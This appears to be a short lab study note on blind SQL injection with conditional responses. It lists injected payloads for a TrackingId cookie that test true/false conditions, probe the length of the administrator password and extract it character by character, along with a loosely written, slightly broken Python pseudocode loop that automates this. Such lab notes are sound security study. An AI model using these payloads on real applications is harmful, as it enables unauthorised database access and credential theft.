# Blind SQL injection

Blind sql injection arises when an application vulnerable to SQL injection without returning the relevant result from SQL query.

## Lab: Blind SQL injection with conditional responses


Example SQL query:
```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
``` 
Example injected SQL query with `' AND '1'='1`:

```

SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4[' AND '1'='1]'
```

Steps:
1. Identify page length with and without "Welcome back!" message

```
' AND '1'='1
' AND '1'='2 
```
3. Determine password length

```
' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password) > 8) = 'a
' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password) < 21) = 'a
```

5. Extract the password

```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),1,1) = 'a
```

Pseudo:
```
for index in range (1, 21):
	for char in chars:
	cookies = {
		"TrackingId" : "' AND SUBSTRING((SELECT password FROM users WHERE
		username 'administrator'),{index},1) = '{char}'"
	}
	requests.get(url, cookies)
```
Automated script in scripts folder.
